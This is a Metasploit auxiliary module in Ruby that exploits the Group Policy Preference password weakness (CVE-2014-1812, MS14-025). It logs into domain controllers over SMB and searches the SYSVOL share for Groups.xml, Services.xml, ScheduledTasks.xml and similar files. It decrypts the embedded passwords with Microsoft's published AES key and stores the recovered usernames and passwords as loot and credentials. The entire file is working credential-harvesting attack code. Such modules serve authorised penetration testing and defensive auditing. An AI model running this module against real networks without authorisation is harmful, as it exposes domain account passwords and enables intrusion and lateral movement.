##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::OptionalSession::SMB

  # Aliases for common classes
  SIMPLE = Rex::Proto::SMB::Client
  XCEPT = Rex::Proto::SMB::Exceptions
  CONST = Rex::Proto::SMB::Constants

  def initialize
    super(
      'Name' => 'SMB Group Policy Preference Saved Passwords Enumeration',
      'Description' => %Q{
        This module enumerates files from target domain controllers and connects to them via SMB.
        It then looks for Group Policy Preference XML files containing local/domain user accounts
        and passwords and decrypts them using Microsoft's public AES key. This module has been
        tested successfully on a Win2k8 R2 Domain Controller.
      },
      'Author' => [
        'Joshua D. Abraham <jabra[at]praetorian.com>',
      ],
      'References' => [
        ['CVE', '2014-1812'],
        ['MSB', 'MS14-025'],
        ['URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/d315342d-41c0-47e3-ab96-7039eb91f5b4'],
        ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
        ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
        ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/']
      ],
      'License' => MSF_LICENSE,
    )
    register_options([
      OptString.new('SMBSHARE', [true, 'The name of the share on the server', 'SYSVOL']),
      OptPort.new('RPORT', [true, 'The Target port', 445]),
      OptBool.new('STORE', [true, 'Store the enumerated files in loot.', true])
    ])
  end

  def check_path(ip, path)
    vprint_status("Trying to download \\\\#{ip}\\#{path}...")
    begin
      fd = simple.open(path, 'ro')
      print_good "Found Policy Share on #{ip}"
      smb_download(ip, fd, path)
    rescue ::RubySMB::Error::UnexpectedStatusCode => e
      case e.status_code.name
      when 'STATUS_FILE_IS_A_DIRECTORY'
        print_good("Directory FOUND: \\\\#{ip}\\#{datastore['SMBSHARE']}\\#{path}")
      when 'STATUS_OBJECT_NAME_NOT_FOUND'
        vprint_error("Object \\\\#{ip}\\#{datastore['SMBSHARE']}\\#{path} NOT found!")
      when 'STATUS_OBJECT_PATH_NOT_FOUND'
        vprint_error("Object PATH \\\\#{ip}\\#{datastore['SMBSHARE']}\\#{path} NOT found!")
      when 'STATUS_ACCESS_DENIED'
        vprint_error("Host reports access denied.")
      when 'STATUS_BAD_NETWORK_NAME'
        vprint_error("Host is NOT connected to #{datastore['SMBDomain']}!")
      when 'STATUS_INSUFF_SERVER_RESOURCES'
        vprint_error("Host rejected with insufficient resources!")
      when 'STATUS_OBJECT_NAME_INVALID'
        vprint_error("opening #{path.inspect} bad filename")
      else
        vprint_error("Server responded unexpected status code: #{e.status_code.name.inspect}")
      end
    ensure
      fd.close unless fd.nil?
    end
  end

  def report_creds(ip, user, password)
    service_data = {
      address: ip,
      port: rport,
      protocol: 'tcp',
      service_name: 'smb',
      workspace_id: myworkspace_id
    }

    new_user = user.sub(/\s+.*/, '')
    first, rest = new_user.split(/\\/)
    if first && rest
      domain = first
      user = rest
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: user,
        private_data: password,
        private_type: :password,
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: domain,
      }
    else
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: new_user,
        private_data: password,
        private_type: :password
      }
    end
    credential_core = create_credential(credential_data.merge(service_data))

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }

    create_credential_login(login_data.merge(service_data))
  end

  def parse_xml(ip, path, xml_file)
    mxml = xml_file[:xml]
    print_status "Parsing file: \\\\#{ip}\\#{datastore['SMBSHARE']}\\#{path}"
    file_type = File.basename(xml_file[:path].gsub("\\", "/"))
    results = Rex::Parser::GPP.parse(mxml)
    tables = Rex::Parser::GPP.create_tables(results, file_type, xml_file[:domain], xml_file[:dc])

    tables.each do |table|
      print_good(table.to_s)
    end

    results.each do |result|
      if datastore['STORE']
        stored_path = store_loot('microsoft.windows.gpp', 'text/xml', ip, xml_file[:xml], file_type, xml_file[:path])
        print_good("XML file saved to: #{stored_path}")
      end

      report_creds(ip, result[:USER], result[:PASS])
    end
  end

  def smb_download(ip, fd, path)
    vprint_status("Downloading #{path}...")

    data = fd.read

    path_elements = path.split('\\')
    ret_obj = {
      :dc => ip,
      :path => path,
      :xml => data
    }
    ret_obj[:domain] = path_elements[0]

    parse_xml(ip, path, ret_obj) if ret_obj

    fname = path.split("\\")[-1]

    if datastore['STORE']
      path = store_loot('smb.shares.file', 'application/octet-stream', ip, data, fname)
      print_good("#{fname} saved as: #{path}")
    end
  end

  def run_host(ip)
    print_status('Connecting to the server...')
    begin
      if session
        print_status("Using existing session #{session.sid}")
        self.simple = session.simple_client
        session.verify_connectivity
      else
        connect
        smb_login
      end

      print_status("Mounting the remote share \\\\#{simple.address}\\#{datastore['SMBSHARE']}'...")
      tree = simple.client.tree_connect("\\\\#{simple.address}\\#{datastore['SMBSHARE']}")

      corp_domain = tree.list.map { |entry| entry.file_name.value.to_s.encode }.detect { |entry| entry != '.' && entry != '..' }
      fail_with(Failure::NotFound, 'Could not find the domain folder') if corp_domain.nil?

      sub_folders = tree.list(directory: "#{corp_domain}\\Policies").map { |entry| entry.file_name.value.to_s.encode }

      gpp_locations = %w(
        MACHINE\\Preferences\\Groups\\Groups.xml
        USER\\Preferences\\Groups\\Groups.xml
        MACHINE\\Preferences\\Services\\Services.xml
        USER\\Preferences\\Printers\\Printers.xml
        USER\\Preferences\\Drives\\Drives.xml
        MACHINE\\Preferences\\Datasources\\DataSources.xml
        USER\\Preferences\\Datasources\\DataSources.xml
        MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml
        USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml
      )
      sub_folders.each do |sub_folder|
        next if sub_folder == '.' || sub_folder == '..'

        gpp_locations.each do |gpp_l|
          check_path(simple.address, "#{corp_domain}\\Policies\\#{sub_folder}\\#{gpp_l}")
        end
      end
    rescue ::Exception => e
      print_error("#{simple.address}: #{e.class} #{e}")
    ensure
      disconnect
    end
  end
end
